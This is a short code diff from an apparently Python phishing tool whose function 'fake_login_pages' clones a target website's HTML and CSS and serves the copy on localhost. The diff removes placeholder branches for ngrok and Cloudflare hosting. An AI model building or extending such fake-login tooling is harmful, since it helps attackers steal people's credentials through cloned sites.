@@ -240,8 +240,8 @@ def fake_login_pages(language):
 
     url = input("URL: ")
 
-    # Selecionar o servidor (por enquanto, apenas localhost)
-    server_choice = '1'  # Escolha padrão para localhost
+    # Selecionar o servidor (apenas localhost)
+    server_choice = '1'
 
     clone_website(url, server_choice, language)
 
@@ -273,15 +273,9 @@ def clone_website(url, server_choice, language):
 
             print("HTML and CSS downloaded successfully!")
 
-            # Continuar com a execução no servidor selecionado
+            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
             if server_choice == '1':
                 run_local_server(language)
-            elif server_choice == '2':
-                # Implementar a lógica para ngrok
-                pass
-            elif server_choice == '3':
-                # Implementar a lógica para Cloudflare
-                pass
 
         else:
             print(f"Failed to clone {url}. Status code: {response.status_code}")
